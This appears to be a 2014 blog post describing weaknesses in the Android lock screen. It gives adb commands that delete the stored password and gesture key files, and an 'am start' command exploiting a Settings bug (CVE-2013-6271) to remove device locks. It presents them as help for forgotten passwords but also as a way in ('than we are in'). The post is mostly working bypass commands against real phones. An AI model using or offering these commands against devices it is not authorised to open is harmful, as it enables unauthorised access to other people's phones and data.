---
layout: post
title: "Android Lock Screen Security issues"
date: 2014-03-20 20:47:14 +0800
comments: true
categories: Android Security
---
On android the lock screen password was so weak.there are many way to break down the password and enter the phone.if you forgot the lock screen password.the following method can help you.   


*  connected you phone to PC,then open ADB tool,input the following command (simply delete the password store file).
```
adb shell rm /data/system/password.key
```
or if you have gesture password
```
adb shell rm /data/system/gesture.key
```


*  There is another bug exists until KitKat(4.4),on the "com.android.settings.ChooseLockGeneric" class.Android implements serveral locks,like pin,password,gesture and even face recognition to lock and unlock a device.we can simply make a fake boardcast and build a specific data type into bundle.than we can make the setting crash.than we are in.
```
adb shell am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task
```

Reference:  
[Remove Device Locks from Android Phone](https://cureblog.de/2013/11/cve-2013-6271-remove-device-locks-from-android-phone/)